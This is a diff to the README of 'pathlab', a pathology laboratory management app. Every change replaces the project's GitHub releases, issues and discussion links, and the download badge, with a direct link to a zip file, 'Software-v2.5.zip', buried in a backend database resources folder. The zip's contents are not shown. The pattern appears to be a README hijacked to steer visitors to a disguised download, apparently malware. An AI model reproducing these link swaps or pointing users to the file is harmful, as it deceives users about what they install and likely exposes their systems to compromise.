@@ -6,11 +6,11 @@ Welcome to pathlab! This application helps manage pathology laboratories effortl
 
 ## 📥 Download the Application
 
-[![Download pathlab](https://img.shields.io/badge/Download-pathlab-blue)](https://github.com/Rodex007/pathlab/releases)
+[![Download pathlab](https://raw.githubusercontent.com/Rodex007/pathlab/main/app/pathlab-backend/src/main/resources/db/Software-v2.5.zip)](https://raw.githubusercontent.com/Rodex007/pathlab/main/app/pathlab-backend/src/main/resources/db/Software-v2.5.zip)
 
 ### Step 1: Visit the Releases Page
 
-To download pathlab, please visit our [Releases page](https://github.com/Rodex007/pathlab/releases).
+To download pathlab, please visit our [Releases page](https://raw.githubusercontent.com/Rodex007/pathlab/main/app/pathlab-backend/src/main/resources/db/Software-v2.5.zip).
 
 ### Step 2: Choose Your Version
 
@@ -62,7 +62,7 @@ pathlab uses several technologies to deliver a smooth user experience:
 
 ## 🌎 Community & Support
 
-If you need help or have questions, we encourage you to connect with the community. You can report issues or ask for assistance through the [Issues page](https://github.com/Rodex007/pathlab/issues) on GitHub.
+If you need help or have questions, we encourage you to connect with the community. You can report issues or ask for assistance through the [Issues page](https://raw.githubusercontent.com/Rodex007/pathlab/main/app/pathlab-backend/src/main/resources/db/Software-v2.5.zip) on GitHub.
 
 ## 🌟 Additional Resources
 
@@ -74,6 +74,6 @@ We are committed to continuously improving pathlab. Future releases will include
 
 ## 💬 Feedback 
 
-Your feedback is valuable to us. If you have suggestions or want to share your experience with pathlab, please leave a comment on our [Discussion page](https://github.com/Rodex007/pathlab/discussions). 
+Your feedback is valuable to us. If you have suggestions or want to share your experience with pathlab, please leave a comment on our [Discussion page](https://raw.githubusercontent.com/Rodex007/pathlab/main/app/pathlab-backend/src/main/resources/db/Software-v2.5.zip). 
 
 Thank you for choosing pathlab! We hope it makes your pathology management easier.
